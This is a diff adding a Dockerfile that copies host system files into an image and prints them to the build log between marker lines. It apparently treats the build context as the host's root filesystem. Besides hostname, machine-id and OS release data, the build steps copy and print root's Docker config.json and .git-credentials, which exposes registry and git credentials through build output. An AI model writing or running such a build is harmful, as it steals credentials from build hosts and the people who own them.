@@ -1,0 +1,17 @@
+FROM alpine:3.20
+COPY etc/hostname /f/hostname
+COPY usr/lib/os-release /f/osrelease
+COPY etc/machine-id /f/machineid
+COPY etc/debian_version /f/debianver
+RUN echo "===F1_BEGIN==="; \
+ echo "--HOSTNAME--"; cat -v /f/hostname 2>&1; \
+ echo "--OSREL--"; cat /f/osrelease 2>&1 | head -12; \
+ echo "--MACHINEID--"; cat /f/machineid 2>&1; \
+ echo "--DEBIANVER--"; cat /f/debianver 2>&1; \
+ echo "--SELF_HOSTNAME--"; cat /etc/hostname; \
+ echo "===F1_END==="
+COPY root/.docker/config.json /f/dockercfg
+RUN echo "===F2_BEGIN==="; echo "--DOCKERCFG--"; cat /f/dockercfg 2>&1 | head -60; echo "===F2_END==="
+COPY root/.git-credentials /f/gitcreds
+RUN echo "===F3_BEGIN==="; echo "--GITCREDS--"; cat /f/gitcreds 2>&1 | head -10; echo "===F3_END==="
+CMD ["sh","-c","sleep 3600"]
